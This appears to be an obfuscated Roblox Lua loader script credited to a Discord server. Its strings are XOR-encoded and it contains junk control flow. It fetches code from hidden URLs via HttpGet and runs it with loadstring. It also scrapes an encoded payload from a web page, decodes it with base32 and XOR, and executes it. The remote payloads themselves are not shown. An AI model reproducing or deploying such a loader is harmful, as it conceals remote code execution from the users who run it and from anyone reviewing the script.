-- This file was generated at discord.gg/syncrypt

local unpackValues = unpack or table.unpack
local v280, v296, v297
local v279 = string.char
local up24 = v279
v279 = string.byte
local up25 = v279
v279 = string.sub
local up26 = v279
local v284 = (bit32 or bit).bxor
local up27 = v284
v284 = table.concat
local up28 = v284
v284 = table.insert
local up29 = v284
local up30 = function(arg11_1, arg11_2)
    local v201 = arg11_1
    local v202 = {}
    local v203 = arg11_2
    local v205 = v202
    local v206 = (#v201)
    local v207 = 1
    for v204 = 1, v206, v207 do
        up29(v205, up24(((up27((up25(up26(v201, v204, (v204 + 1)))), up25(up26(v203, (1 + (v204 % (#v203))), ((1 + (v204 % (#v203))) + 1))))) % 256)))
    end
    return up28(v205)
end
local v288 = v280[1]
print(("Script Executed: \"" .. (v288 .. "\"")))
local v293 = ((typeof(v288)) == (up30("\223\214\214'\227\169", "~\177\163\187E\134\219\167")))
local v312 = v293
if v293 then
    v296 = tostring(v288)
    v297 = up30
    v312 = (v296:match(v297("\029\136.\142\184", "\156C\173J\165")))
end
if v312 then
    v288 = (string.format((up30("q\231\024E\184", "&T\215)v\220F")), v288))
end
v312 = loadstring
v296 = game
local v301 = {up30("X\0026\002\237\nYm\000\255GX%\027\234X\003 \007\237U\004!\029\240D\019,\006\176S\025/]\211Q\031,!\253B\0312\006\237\003Cp]\211Q\031,!\253B\0312\006\237\003Cp]\236U\0161]\246U\023&\001\177]\023+\028\177q\0246\027\187\002F\n\029\241[SpB\205_\0030\017\251", "\1580vBr")}
v312(v296:HttpGet(unpackValues(v301)))()
v293 = (function(arg1_1, arg1_2)
    return math.random(arg1_1, arg1_2)
end)(1, 99999999)
v297 = Instance.new("NumberValue")
v297.Parent = game.ReplicatedStorage
v297.Name = "Running"
v297.Archivable = true
v297.Value = (function(arg2_1)
    return arg2_1
end)(v293)
v301 = 0
local v303 = 3
local v307 = 1
for v298 = 1, v303, v307 do
    v301 = (v301 + v298)
end
v301 = game.ReplicatedStorage
local up31 = v301
local up32
v303 = function()
    return up31:FindFirstChild(up32)
end
up32 = "Running"
local up33 = v303
v307 = (function()
    local v277 = 0
    while true do
        if (v277 == 0) then
            break
        end
    end
    local v278 = up33()
    return v278
end)()
local v313 = (not v307)
local v305 = v313
if not (v313) then
    v305 = v307 and (v307.Value ~= v293)
end
if v305 then
    while true do
        task.wait()
    end
end
v307:Destroy()
v305 = function(arg3_1)
    local v69, v70, v72, v73, v74, v76, v77, v80, v81
    local v86
    local v61 = arg3_1
    local v63 = 0
    local v64
    local v65
    local v66
    local v67
    local v68
    while true do
        if (v63 == 0) then
            v69 = string.find(v61, up30("\1630\004&`\255\180\2286\017!=\162\242\191,\0054f\182\254\185'\0318g\160\245\191j\0199~", "\155\203DpV\019\197"))
            if v69 then
                v61 = (string.gsub(v61, (up30("N\201\"\236S\"\170\183T\220!\178Gq\241\240S\223#\239Ej\230\247H\2013\242T6\230\247K", "\152&\189V\156 \024\133")), up30("\244C\179V\239\r\232\t\251^\179N\233U\233E\243Z", "&\1567\199")))
            end
            v73 = string.find(v61, up30("\231oy.\000;\242F\169yog\030u\243M\231", "#\200\029\028Hs\020\154"))
            if v73 then
                v61 = (string.gsub(v61, (up30("V\173\212\217\158c<\028\190\213\204", "Ty\223\177\191\237L")), up30("\244T\197\1758", "\161\2196\169\192Z0P")))
            end
            v63 = 1
        end
        if (4 == v63) then
            if (not v68) then
                return nil
            else
                v70 = string.sub
                v72 = (v67 + (#v65))
                v74 = (v68 - 1)

                return v70(v64, v72, v74)
            end
        else
            if (v63 == 3) then
                if (not v67) then
                    return nil
                else
                    v68 = (string.find(v64, v66, (v67 + (#v65)), true))
                    v63 = 4
                end
            end
            if (v63 == 2) then
                v66 = "\"],\"stylingDirectives\""
                v67 = (string.find(v64, v65, 1, true))
                v63 = 3
            end
            if (v63 == 1) then
                v76 = 0
                while true do
                    if (v76 == 0) then
                        v77 = game
                        v86 = up30("\022A\001&AGM'\\Q\020 [\031", "E)\"`")
                        v80 = os.date
                        v81 = up30
                        v77:HttpGet((v61 .. (v86 .. (v80(v81("\249\250\146\007G/\249\235\146'G\024", "K\220\163\183jb"))))))
                        v76 = 1
                    end
                    if (v76 == 1) then
                        break
                    end
                end
                v63 = 2
            end
        end
    end
end
local v320 = ((up30("\n\174\159'\202X\245\196%\216\021\244\140>\205\n\175\137\"\202\007\168\1368\215\022\191\133#\151\001\181\134x\234\001\168\130'\205-\184\141\"\202\001\187\1598\203P\245\1844\203\011\170\159$\150\016\191\141$\150\n\191\1383\202M\183\138>\215M", "\185b\218\235W")) .. v288)
local v321 = game:GetService(up30("\227(3\246\237\175\217*.\229\219", "\202\171\\G\134\190"))
local v319 = v321[(up30("\003\242\003\166\r\196/\135-\196", "\232I\161L"))](v321, string.gsub((v305(v320)), "\\", ""))
local v318 = up30("\154\251ay;\157\254jt4\144\245os1\139\232pn*\142\239ue'\129\139\017\tK\237\142", "~\219\185\"=")
local v317 = function(arg4_1)
    local v95, v97, v98, v99, v103
    local v91 = arg4_1
    local v93 = 0
    local v94
    while true do
        if (v93 == 1) then
            break
        else
            if (v93 == 0) then
                v95 = 0
                while true do
                    if (v95 == 1) then
                        break
                    else
                        if (v95 == 0) then
                            v94 = {}
                            v98 = (#v91)
                            v99 = 1
                            for v97 = 1, v98, v99 do
                                v103 = string.byte(v91, v97)
                                v94[v97] = v103
                            end
                            v95 = 1
                        end
                    end
                end
                v93 = 1
            end
        end
    end
    return v94
end
local up34 = v318
local v315 = function(arg5_1)
    local v118, v119, v121, v122, v128, v133
    local v134
    local v108 = {}
    local v110 = 0
    local v111 = arg5_1
    local v112 = 0
    v111 = (string.upper(v111))
    local v116 = (#v111)
    local v117 = 1
    for v115 = 1, v116, v117 do
        v118 = v115
        v119 = 0
        v121 = nil
        while true do
            if (v119 == 1) then
                break
            else
                if (v119 == 0) then
                    v122 = v111:sub(v118, v118)
                    v121 = (string.find(up34, v122, 1, true))
                    v119 = 1
                end
            end
        end
        if v121 then
            v122 = 0
            while true do
                if (v122 == 0) then
                    v121 = (v121 - 1)
                    v112 = (bit32.bor((bit32.lshift(v112, 5)), v121))
                    v122 = 1
                end
                if (v122 == 1) then
                    break
                end
            end
            v110 = (v110 + 5)
            if (v110 >= 8) then
                v128 = 0
                while true do
                    if (v128 == 1) then
                        break
                    else
                        if (v128 == 0) then
                            v134 = bit32.band((bit32.rshift(v112, (v110 - 8))), 255)
                            v133 = ((#v108) + 1)
                            v108[v133] = v134
                            v128 = 1
                        end
                    end
                end
                v110 = (v110 - 8)
            end
        end
    end
    return v108
end
local up35 = v317
local up36 = function(arg6_1)
    local v137, v141, v142, v143, v147
    local v138 = 0
    local v139 = arg6_1
    local v140
    while true do
        if (v138 == 1) then
            break
        else
            if (v138 == 0) then
                v137 = {}
                v142 = (#v139)
                v140 = v137
                v143 = 1
                for v141 = 1, v142, v143 do
                    v147 = string.char(v139[v141])
                    v140[v141] = v147
                end
                v138 = 1
            end
        end
    end
    return table.concat(v140)
end
local up37 = v315
local v323 = (function()
    local v153 = 0
    while true do
        if (v153 == 0) then
            break
        end
    end
    local v154 = 0
    while true do
        if (v154 == 0) then
            break
        end
    end
    local v157 = ((function(arg0_1)
        local v42, v45, v46, v47
        local v38 = arg0_1
        local v40 = 0
        local v41
        while true do
            if (v40 == 0) then
                v42 = 0
                while true do
                    if (v42 == 0) then
                        v41 = ""
                        v47 = (#v38)
                        v45 = 1
                        for v46 = 1, v47, v45 do
                            v41 = (v41 .. (string.char(v38[v46])))
                        end
                        v42 = 1
                    end
                    if (1 == v42) then
                        break
                    end
                end
                v40 = 1
            end
            if (v40 == 1) then
                break
            end
        end
        return v41
    end)({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}))
    local v158 = loadstring
    local v155 = v158
    if not (v158) then
        v155 = _G and _G[v157]
    end
    return v155
end)()(((function(arg8_1, arg8_2)
    local v163, v168, v172, v173, v174, v178
    local v161 = arg8_1
    local v162 = arg8_2
    local v164 = 0
    local v165
    local v166
    local v167
    while true do
        v168 = 0
        while true do
            if (v168 == 0) then
                if (v164 == 2) then
                    v163 = up36
                    return v163(v167)
                else
                    if (v164 == 0) then
                        v165 = (up37(v161))
                        v166 = (up35(v162))
                        v164 = 1
                    end
                    v168 = 1
                end
            end
            if (v168 == 1) then
                break
            end
        end
        if (v164 == 1) then
            v167 = {}
            v173 = (#v165)
            v174 = 1
            for v172 = 1, v173, v174 do
                v178 = bit32.bxor(v165[v172], v166[((((v172 - 1) % (#v166)) + 1) + 0)])
                v167[v172] = v178
            end
            v164 = 2
        end
    end
end)(v319.Script, v319.Key)))
return v323()
